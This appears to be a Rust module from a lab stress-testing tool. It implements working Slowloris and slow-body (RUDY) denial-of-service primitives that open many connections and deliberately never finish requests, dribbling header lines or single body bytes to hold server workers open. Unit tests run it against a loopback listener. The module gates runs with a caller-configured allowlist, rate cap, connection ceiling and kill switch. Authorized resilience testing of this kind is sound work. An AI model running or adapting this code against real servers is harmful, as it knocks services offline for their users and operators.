//! # Slow-connection L7 primitives — Slowloris & slow-body (isolated-lab use)
//!
//! Low-volume application-layer exhaustion. Instead of completing requests as
//! fast as possible (that is [`crate::L7Engine`]), these primitives open TCP
//! connections and **never finish the request**, dribbling a keep-alive byte
//! every `drip` so the target holds the connection (and its worker/slot) open:
//!
//!   - [`SlowMode::Headers`] — **Slowloris**: send a request line + a `Host`
//!     header but *never* the terminating blank line, trickling one extra header
//!     line per tick. Exercises the server's request-header read timeout.
//!   - [`SlowMode::Body`] — **slow body** (R-U-Dead-Yet style): send complete
//!     headers with a large `Content-Length`, then trickle the body one byte per
//!     tick, never reaching the declared length. Exercises the body read timeout.
//!
//! ## Same safety boundary as the fast engine
//!
//! Authorization is identical: the URL host is validated as a **datum**
//! ([`crate::authorize_datum`]) and resolved **once** to a pinned connect
//! address ([`crate::resolve_addrs`]). Connections only ever go to that
//! gate-authorized address. The run is bounded by `duration`, capped by the
//! rate cap (reinterpreted as *connections opened per second*) and by
//! `max_conns` (concurrent ceiling), and aborts promptly on the kill switch.
//!
//! `https` is refused for now (dribbling raw bytes through a TLS session is not
//! implemented); slow mode is http-only and fails closed.

use std::net::SocketAddr;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};

use tokio::io::AsyncWriteExt;
use tokio::net::TcpStream;
use tokio::task::JoinSet;
use tokio::time::MissedTickBehavior;

use jinrai_core::{Layer, RunPlan, RunReport, StressModule};
use jinrai_safety::Authorization;

use crate::{authorize_datum, resolve_addrs, wait_for_kill, L7Error};

/// Which slow primitive to run.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SlowMode {
    /// Slowloris: partial request headers, never terminated.
    Headers,
    /// Slow body (RUDY): full headers, oversized `Content-Length`, trickled body.
    Body,
}

impl SlowMode {
    fn label(self) -> &'static str {
        match self {
            SlowMode::Headers => "l7-slowloris",
            SlowMode::Body => "l7-slowbody",
        }
    }
}

/// Runtime configuration for a slow-connection run.
#[derive(Debug, Clone, Copy)]
pub struct SlowConfig {
    pub mode: SlowMode,
    /// Concurrent connection ceiling. New connections are opened (rate-capped)
    /// up to this many, then the run just keeps them alive until the deadline.
    pub max_conns: usize,
    /// Interval between keep-alive writes on each held connection.
    pub drip: Duration,
}

/// The slow-connection engine. Holds a clone of the gate (the sole authority),
/// the target URL, and the run config.
#[derive(Debug, Clone)]
pub struct L7SlowEngine {
    gate: Authorization,
    url: String,
    cfg: SlowConfig,
}

impl L7SlowEngine {
    pub fn new(gate: Authorization, url: impl Into<String>, cfg: SlowConfig) -> Self {
        Self { gate, url: url.into(), cfg }
    }

    /// Authorize the datum (public so the CLI can fail-closed before any run).
    /// Also enforces the http-only rule so an `https` URL is refused up front.
    pub fn authorize_target(&self) -> Result<Vec<jinrai_safety::AuthorizedTarget>, L7Error> {
        let datum = authorize_datum(&self.gate, &self.url)?;
        if datum.url.scheme() == "https" {
            return Err(L7Error::SlowHttpsUnsupported);
        }
        Ok(vec![datum.target])
    }

    /// Authorize + resolve-once into the pinned connect address and the request
    /// line / Host header used for every connection.
    fn prepare(&self) -> Result<Prepared, L7Error> {
        let datum = authorize_datum(&self.gate, &self.url)?;
        if datum.url.scheme() == "https" {
            return Err(L7Error::SlowHttpsUnsupported);
        }
        let addr = *resolve_addrs(&datum)?.first().expect("resolve_addrs is non-empty");

        let mut target = datum.url.path().to_string();
        if let Some(q) = datum.url.query() {
            target.push('?');
            target.push_str(q);
        }
        if target.is_empty() {
            target.push('/');
        }
        let host_header = match datum.url.port() {
            Some(p) => format!("{}:{}", datum.host, p),
            None => datum.host.clone(),
        };

        Ok(Prepared { addr, target, host_header })
    }

    fn refusal_report(&self, e: L7Error) -> RunReport {
        RunReport {
            layer_label: format!("L7 {} REFUSED: {e}", self.cfg.mode.label()),
            aborted_early: true,
            ..Default::default()
        }
    }
}

struct Prepared {
    addr: SocketAddr,
    target: String,
    host_header: String,
}

impl StressModule for L7SlowEngine {
    fn layer(&self) -> Layer {
        Layer::L7
    }

    fn name(&self) -> &str {
        self.cfg.mode.label()
    }

    fn execute(&mut self, plan: &RunPlan) -> RunReport {
        let Prepared { addr, target, host_header } = match self.prepare() {
            Ok(p) => p,
            Err(e) => return self.refusal_report(e),
        };

        // Rate cap: min spacing between opening connections. `None` => send nothing.
        let Some(open_interval) = plan.rate_cap.min_interval() else {
            return RunReport {
                layer_label: format!(
                    "L7 {} {} (rate cap 0 — opened nothing)",
                    self.cfg.mode.label(),
                    self.url
                ),
                aborted_early: false,
                ..Default::default()
            };
        };

        let rt = match tokio::runtime::Builder::new_multi_thread().enable_all().build() {
            Ok(rt) => rt,
            Err(e) => return self.refusal_report(L7Error::Client(e.to_string())),
        };

        let established = Arc::new(AtomicU64::new(0));
        let errors = Arc::new(AtomicU64::new(0));
        // Write handles move into the runtime; the originals are read back after.
        let established_w = established.clone();
        let errors_w = errors.clone();

        let mode = self.cfg.mode;
        let drip = self.cfg.drip;
        let max_conns = self.cfg.max_conns;
        let duration = plan.duration;
        let kill = plan.kill.clone();
        let target = Arc::new(target);
        let host_header = Arc::new(host_header);

        let aborted = rt.block_on(async move {
            let deadline = Instant::now() + duration;
            let mut opener = tokio::time::interval(open_interval);
            opener.set_missed_tick_behavior(MissedTickBehavior::Delay);
            let mut tasks: JoinSet<()> = JoinSet::new();
            let mut opened = 0usize;
            let mut aborted = false;

            // Phase 1: open up to max_conns, respecting the rate cap, kill and deadline.
            while opened < max_conns {
                tokio::select! {
                    _ = opener.tick() => {}
                    _ = wait_for_kill(kill.clone()) => { aborted = true; break; }
                }
                if kill.is_tripped() {
                    aborted = true;
                    break;
                }
                if Instant::now() >= deadline {
                    break;
                }
                opened += 1;
                tasks.spawn(hold_connection(
                    addr,
                    target.clone(),
                    host_header.clone(),
                    mode,
                    drip,
                    deadline,
                    kill.clone(),
                    established_w.clone(),
                    errors_w.clone(),
                ));
            }

            // Phase 2: keep the connections alive until the deadline (or kill).
            if !aborted {
                let remaining = deadline.saturating_duration_since(Instant::now());
                tokio::select! {
                    _ = tokio::time::sleep(remaining) => {}
                    _ = wait_for_kill(kill.clone()) => { aborted = true; }
                }
            }

            tasks.abort_all();
            while tasks.join_next().await.is_some() {}
            aborted
        });

        RunReport {
            layer_label: format!(
                "L7 {} {} ({} connection{} held)",
                self.cfg.mode.label(),
                self.url,
                established.load(Ordering::Relaxed),
                if established.load(Ordering::Relaxed) == 1 { "" } else { "s" }
            ),
            units_sent: established.load(Ordering::Relaxed),
            errors: errors.load(Ordering::Relaxed),
            aborted_early: aborted,
            ..Default::default()
        }
    }
}

/// Open one connection and keep it half-open until the deadline or kill. Counts
/// a successful connect+opening-write as `established`; a failed connect as an
/// `error`. A mid-run write failure (the server timing us out) is the *expected*
/// end of a held connection, not an error — we simply stop.
#[allow(clippy::too_many_arguments)]
async fn hold_connection(
    addr: SocketAddr,
    target: Arc<String>,
    host_header: Arc<String>,
    mode: SlowMode,
    drip: Duration,
    deadline: Instant,
    kill: jinrai_safety::KillSwitch,
    established: Arc<AtomicU64>,
    errors: Arc<AtomicU64>,
) {
    let connect = tokio::time::timeout(Duration::from_secs(10), TcpStream::connect(addr));
    let mut stream = match connect.await {
        Ok(Ok(s)) => s,
        _ => {
            errors.fetch_add(1, Ordering::Relaxed);
            return;
        }
    };

    // Opening bytes: a request that is deliberately never completed.
    let opening = match mode {
        SlowMode::Headers => {
            // Request line + Host, but NO terminating "\r\n" — the server keeps
            // waiting for the rest of the headers.
            format!("GET {target} HTTP/1.1\r\nHost: {host_header}\r\nUser-Agent: jinrai\r\n")
        }
        SlowMode::Body => {
            // Complete headers with an oversized body length, then trickle the body.
            format!(
                "POST {target} HTTP/1.1\r\nHost: {host_header}\r\n\
                 Content-Type: application/x-www-form-urlencoded\r\n\
                 Content-Length: 1048576\r\n\r\n"
            )
        }
    };
    if stream.write_all(opening.as_bytes()).await.is_err() {
        errors.fetch_add(1, Ordering::Relaxed);
        return;
    }
    established.fetch_add(1, Ordering::Relaxed);

    let mut n = 0u64;
    while Instant::now() < deadline && !kill.is_tripped() {
        tokio::time::sleep(drip).await;
        if kill.is_tripped() {
            break;
        }
        n += 1;
        let chunk = match mode {
            SlowMode::Headers => format!("X-{n}: {n}\r\n"),
            SlowMode::Body => "a".to_string(),
        };
        if stream.write_all(chunk.as_bytes()).await.is_err() {
            // Server closed us out (its timeout fired) — the expected outcome.
            break;
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::ErrorKind;
    use std::net::TcpListener;
    use std::sync::atomic::AtomicBool;
    use std::thread;

    use jinrai_core::RateCap;
    use jinrai_safety::{Allowlist, KillSwitch};

    fn gate_cidrs(cidrs: &[&str]) -> Authorization {
        Authorization::new(Allowlist::from_cidrs(cidrs).unwrap(), KillSwitch::new())
    }

    fn cfg(mode: SlowMode) -> SlowConfig {
        SlowConfig { mode, max_conns: 2, drip: Duration::from_millis(100) }
    }

    fn plan(gate: &Authorization, url: &str, rate: u64, ms: u64) -> RunPlan {
        let engine = L7SlowEngine::new(gate.clone(), url, cfg(SlowMode::Headers));
        RunPlan {
            targets: engine.authorize_target().expect("authorize"),
            rate_cap: RateCap::new(rate),
            duration: Duration::from_millis(ms),
            kill: KillSwitch::new(),
        }
    }

    #[test]
    fn https_url_refused_http_only() {
        let engine =
            L7SlowEngine::new(gate_cidrs(&["127.0.0.0/8"]), "https://127.0.0.1/", cfg(SlowMode::Headers));
        assert!(matches!(engine.authorize_target(), Err(L7Error::SlowHttpsUnsupported)));
    }

    #[test]
    fn unauthorized_target_refused() {
        // 127.0.0.1 is not inside 10.0.0.0/8 => fail-closed.
        let engine =
            L7SlowEngine::new(gate_cidrs(&["10.0.0.0/8"]), "http://127.0.0.1/", cfg(SlowMode::Headers));
        assert!(engine.authorize_target().is_err());
    }

    #[test]
    fn mode_surfaces_in_name() {
        for (mode, want) in [(SlowMode::Headers, "l7-slowloris"), (SlowMode::Body, "l7-slowbody")] {
            let engine = L7SlowEngine::new(gate_cidrs(&["127.0.0.0/8"]), "http://127.0.0.1/", cfg(mode));
            assert_eq!(engine.name(), want);
        }
    }

    #[test]
    fn rate_zero_opens_nothing() {
        let g = gate_cidrs(&["127.0.0.0/8"]);
        let mut engine = L7SlowEngine::new(g.clone(), "http://127.0.0.1:9/", cfg(SlowMode::Headers));
        let report = engine.execute(&plan(&g, "http://127.0.0.1:9/", 0, 100));
        assert_eq!(report.units_sent, 0);
        assert!(!report.aborted_early);
        assert!(report.layer_label.contains("opened nothing"));
    }

    #[test]
    fn slowloris_holds_connections_to_local_listener() {
        // A bare TCP listener that accepts and holds connections (never replies).
        // The slow engine should establish and keep at least one open.
        let listener = TcpListener::bind(("127.0.0.1", 0)).unwrap();
        let port = listener.local_addr().unwrap().port();
        listener.set_nonblocking(true).unwrap();
        let stop = Arc::new(AtomicBool::new(false));

        let stop_srv = stop.clone();
        let server = thread::spawn(move || {
            let mut held = Vec::new();
            while !stop_srv.load(Ordering::Relaxed) {
                match listener.accept() {
                    Ok((s, _)) => held.push(s),
                    Err(ref e) if e.kind() == ErrorKind::WouldBlock => {
                        thread::sleep(Duration::from_millis(5));
                    }
                    Err(_) => break,
                }
            }
        });

        let url = format!("http://127.0.0.1:{port}/");
        let g = gate_cidrs(&["127.0.0.0/8"]);
        let mut engine = L7SlowEngine::new(g.clone(), url.clone(), cfg(SlowMode::Headers));
        let report = engine.execute(&plan(&g, &url, 50, 700));

        stop.store(true, Ordering::Relaxed);
        server.join().unwrap();

        assert!(report.units_sent > 0, "should hold at least one connection open");
        assert_eq!(report.errors, 0, "loopback connects should not error");
        assert!(!report.aborted_early);
    }
}
